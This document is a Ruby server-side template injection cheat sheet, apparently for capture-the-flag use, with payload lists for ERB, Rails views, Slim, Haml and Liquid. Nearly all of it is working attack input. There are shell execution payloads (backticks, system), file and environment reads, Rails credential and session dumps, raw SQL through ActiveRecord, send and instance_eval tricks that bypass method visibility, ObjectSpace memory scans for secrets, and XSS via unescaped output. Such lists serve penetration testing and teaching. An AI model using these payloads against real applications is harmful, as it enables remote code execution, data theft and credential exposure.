# Ruby engines — ERB, Slim, Haml, Liquid

Ruby template injection reaches `system`/backticks/`File.read` —
full language access unless sandboxed (Liquid is the sandboxed one).

---

## 1. ERB — `<%= %>` / `<% %>`

```erb
<%= 7*7 %>                    → 49
<%= `id` %>                    -- backticks = shell exec!
<%= system('id') %>
<%= `cat /flag` %>
<%= File.read('/flag') %>
<%= File.open('/flag').read %>
<%= IO.read('/flag') %>
<%= Dir['/*'] %>               -- directory listing
<%= ENV %>                     -- env vars — flag often here!
<%= ENV['FLAG'] %>
<%= self.inspect %>            -- the binding self
<%= @flag %>                   -- instance vars — app-bound secrets
<%= @@x %>                     -- class vars
<%= $x %>                      -- globals
<%= request.params %>          -- if bound (Rails/Sinatra)
```

ERB runs Ruby verbatim — `<%= `id` %>` is the canonical RCE.
`<% code %>` for statements, `<%= %>` for output.

---

## 2. Rails view injection — the ERB-in-Rails context

```erb
<%= params %>                  -- all params
<%= session %>                 -- session
<%= cookies %>                 -- cookies
<%= flash %>                   -- flash messages
<%= Rails.application.credentials %>     -- credentials file!
<%= Rails.application.secrets %>         -- legacy secrets
<%= Rails.root %>                        -- app root
<%= controller.send(:flag) %>            -- private methods via send
<%= ApplicationController.send(...) %>
<%= User.first %>                        -- model data — AR objects!
<%= User.find_by_admin(true) %>
<%= ActiveRecord::Base.connection.execute('SELECT * FROM flag') %>
   -- raw SQL through the model layer — flag tables!
```

`send` bypasses `private` — reaches any method on bound objects.
Model-layer access is huge — `User.all`, `.find`, raw `.execute`.

---

## 3. Slim — `= expr` lines

```slim
= 7*7                    → 49
= `id`
= system('id')
= File.read('/flag')
= ENV['FLAG']
| #{'x'}                 -- text-line interpolation
== <script>alert(1)</script>   -- unescaped output
```

Slim's `=` evaluates Ruby. `==` renders unescaped (XSS path).
Indentation-sensitive — the payload must fit the template's
indentation level to parse.

---

## 4. Haml — `%tag= expr` or `= expr`

```haml
= 7*7
= `id`
= system('id')
= File.read('/flag')
%div= 7*7                -- inside element
= link_to 'x', 'javascript:alert(1)'   -- helpers
= render '/etc/passwd'   -- render → file read attempt
~ `id`                   -- ~ is unescaped eval
```

Haml `=`/`~` run Ruby; `~` unescaped.

---

## 5. Liquid — the sandboxed engine (Shopify/Jekyll)

```liquid
{{ 7 | times: 7 }}              -- math via FILTERS not operators
{{ 'a' | append: 'b' }}
{{ user }}                      -- context dump
{{ site }}                      -- Jekyll site object
{{ settings }}
{{ collection.products }}
{{ 'x' | upcase }}
{{ user.email }}                -- attrs reachable
{{ x | date: '%s' }}            -- filters only
{{ user.password }}             -- field leak if object bound
```

Liquid has NO raw-Ruby — only drop-attributes and registered
filters. The attack surface:

```liquid
{{x | map: 'password'}}           -- map over collections → extract
{{x | where: 'admin', true}}      -- filter records
{{layout}} {{content}}             -- layout objects
{{forloop}} {{paginate}}
{{x.y.z}}                          -- deep attr chains on drops
{{x['y']}}                         -- bracket access
{{x | json}}                        -- json filter dumps structure
{{x | inspect}}                     -- debug dump — leaks internals!
```

Liquid exploitation = data exfiltration through allowed attrs —
flag lives in a model field the template can reach. No RCE in
standard Liquid; look for bound objects with sensitive fields.

---

## 6. The Ruby `send`/`public_send` trick — method-reach

```erb
<%= obj.send(:private_method) %>
<%= obj.public_send('id') %>
<%= ''.send(:system,'id') %>      -- String doesn't have system —
                                   but Kernel methods reachable:
<%= ''.send(:instance_eval,'`id`') %>  -- instance_eval → self-exec
<%= ''.instance_eval('`id`') %>
<%= eval('`id`') %>                  -- direct eval if allowed
```

`instance_eval`/`send` reach around method-visibility. `.send` on
any object can invoke private methods.

---

## 7. The `ObjectSpace` walk — find bound secrets

```erb
<%= ObjectSpace.each_object(String).select{|s| s.include?('flag')} %>
<%= ObjectSpace.each_object.to_a.size %>
<%= GC.start; ObjectSpace.each_object(Class).map(&:name) %>
```

`ObjectSpace` walks ALL live objects — a flag-shaped string living
in memory can be found by scan. Slow on big apps; bounded try.

---

## 8. The quick sequences

### ERB
```erb
<%=7*7%>
<%=`id`%>
<%=File.read('/flag')%>
<%=ENV%>
<%=params%>
<%=Rails.application.credentials rescue nil%>
```

### Liquid
```liquid
{{7|times:7}}
{{user}}
{{user|json}}
{{settings}}
{{collection|first}}
{{x|map:'password'}}
```

### Slim/Haml
```slim
=7*7
=`id`
=File.read('/flag')
```
